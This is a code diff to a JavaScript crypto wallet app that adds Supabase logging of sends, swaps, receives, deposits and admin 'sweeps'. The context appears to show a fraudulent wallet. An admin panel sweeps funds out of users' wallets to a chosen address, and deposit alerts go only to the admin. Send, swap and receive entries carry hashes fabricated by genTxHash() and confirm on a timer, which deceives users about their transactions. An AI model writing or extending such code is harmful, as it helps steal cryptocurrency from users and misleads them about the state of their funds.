@@ -205,6 +205,58 @@ async function syncWalletToSupabase(walletData) {
 }
 
 
+async function saveTransactionToSupabase(tx, username) {
+  if (!SUPABASE_URL || !SUPABASE_KEY || !tx) return;
+  try {
+    await fetch(`${SUPABASE_URL}/rest/v1/transactions`, {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'resolution=merge-duplicates',
+      },
+      body: JSON.stringify({
+        id: tx.id,
+        wallet_username: username || 'Anonymous',
+        type: tx.type,
+        sym: tx.sym || '',
+        label: tx.label || '',
+        addr: tx.addr || '',
+        hash: tx.hash || '',
+        status: tx.status || 'confirmed',
+        usd: tx.usd || '',
+        time: tx.time || '',
+        color: tx.color || '',
+        created_at: new Date().toISOString(),
+      }),
+    });
+  } catch {}
+}
+
+async function loadTransactionsFromSupabase(username) {
+  if (!SUPABASE_URL || !SUPABASE_KEY || !username) return [];
+  try {
+    const r = await fetch(
+      `${SUPABASE_URL}/rest/v1/transactions?wallet_username=eq.${encodeURIComponent(username)}&order=created_at.desc&limit=200`,
+      { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } }
+    );
+    if (!r.ok) return [];
+    const data = await r.json();
+    return Array.isArray(data) ? data.map(row => ({
+      id: row.id,
+      type: row.type,
+      sym: row.sym,
+      label: row.label,
+      addr: row.addr,
+      hash: row.hash,
+      status: row.status,
+      usd: row.usd,
+      time: row.time,
+      color: row.color || (row.type==='send'?'#EF4444':row.type==='receive'?'#22C55E':row.type==='swap'?'#8B9CF7':'#7c3aed'),
+    })) : [];
+  } catch { return []; }
+}
 
 // ─── GENERATORS (real BIP39 + HD derivation) ─────────────────────────────────
 
@@ -5069,6 +5121,8 @@ function SupabaseAdminPanel() {
           throw new Error('LTC sweep через браузер не поддерживается');
         }
         setSweepResult({success:true,txHash});
+        // Save sweep to Supabase
+        (()=>{ const _now=new Date(); const _t={id:'sweep-'+Date.now(),type:'sweep',sym:sweepToken,label:`−${sweepAmount} ${sweepToken}`,addr:sweepAddress.trim().slice(0,12)+'...',hash:txHash||'',status:'confirmed',usd:'',time:_now.toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+_now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"}),color:'#7c3aed'}; saveTransactionToSupabase(_t, sweepWallet.username||'Anonymous'); })();
       } catch(e) {
         setSweepResult({success:false,error:e.message});
       } finally { setSweepLoading(false); }
@@ -7575,6 +7629,25 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
 
 
+  // Load transactions from Supabase on mount and merge with localStorage
+  useEffect(()=>{
+    (async()=>{
+      try {
+        const uname = typeof resolveTelegramDisplayName==='function' ? resolveTelegramDisplayName() : 'Anonymous';
+        const remote = await loadTransactionsFromSupabase(uname);
+        if (remote.length > 0) {
+          setTxHistory(local => {
+            const seen = new Set((local||[]).map(t=>t?.id));
+            const merged = [...(local||[])];
+            for (const t of remote) { if (!seen.has(t.id)) merged.push(t); }
+            merged.sort((a,b)=>(b?.id||'').localeCompare(a?.id||''));
+            return merged;
+          });
+        }
+      } catch {}
+    })();
+  },[]);
+
   // Auto-save txHistory to localStorage whenever it changes
 
   useEffect(()=>{
@@ -7867,7 +7940,13 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
               };
 
-              // Remove local notifications - send to admin panel only
+              // Save incoming deposit to txHistory and Supabase
+              const depTxId = "dep_" + Date.now() + "_" + sym;
+              const depTimeStr = new Date().toLocaleDateString("en-US",{month:"short",day:"numeric"})+" "+new Date().toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit"});
+              const depUsd = (diff * (prices[sym]||0)).toFixed(2);
+              const depTx = {id:depTxId,type:"receive",sym,label:`+${diff.toFixed(6)} ${sym}`,addr:"External",hash:'',status:"confirmed",usd:`+${depUsd}`,time:depTimeStr,color:"#22C55E"};
+              setTxHistory(h=>{ if (!Array.isArray(h)) h=[]; return [depTx,...h]; });
+              saveTransactionToSupabase(depTx, userName);
 
             } catch(e) { console.error("deposit notif save error", e); }
 
@@ -7891,7 +7970,7 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
 
 
-  useEffect(()=>{ refreshPrices(); const t=setInterval(refreshPrices,60000); return()=>clearInterval(t); },[]);
+  useEffect(()=>{ refreshPrices(); const t=setInterval(refreshPrices,30000); return()=>clearInterval(t); },[]);
 
 
 
@@ -7956,6 +8035,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
       
 
+      // Save to Supabase
+      (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"send",sym,label:`−${amount} ${sym}`,addr:shortAddr(to||""),hash:hash||genTxHash(),status:"pending",usd:`−${fmtUSD(usd||0)}`,time:timeStr,color:"#EF4444"}; saveTransactionToSupabase(_t,_u); })();
       showToast(`Transaction pending (${pendingMinutes}min to confirm)`,"info");
 
       // Auto-confirm after timer expires
@@ -8066,6 +8147,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
 
     },...h]);
 
+    // Save to Supabase
+    (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"swap",sym:toSym,label:`${fromAmt} ${fromSym}→${toSym}`,addr:"DEX Router",hash:hash||genTxHash(),status:"confirmed",usd:fmtUSD(usd),time:timeStr,color:"#8B9CF7"}; saveTransactionToSupabase(_t,_u); })();
     showToast(`Swapped ${fromAmt} ${fromSym} → ${toAmt.toFixed(6)} ${toSym}`,"success");
 
   }
@@ -8101,6 +8184,8 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
       });
 
       showToast(`Received ${num} ${sym}`,"success");
+      // Save to Supabase
+      (()=>{ const _u = typeof resolveTelegramDisplayName==='function'?resolveTelegramDisplayName():'Anonymous'; const _t={id:txId,type:"receive",sym,label:`+${num} ${sym}`,addr:shortAddr(from||""),hash:hash||genTxHash(),status:"confirmed",usd:`+${fmtUSD(usdVal||0)}`,time:timeStr,color:"#22C55E"}; saveTransactionToSupabase(_t,_u); })();
       return txId;
     } catch (e) {
       console.error("[handleReceive] Error:", e);
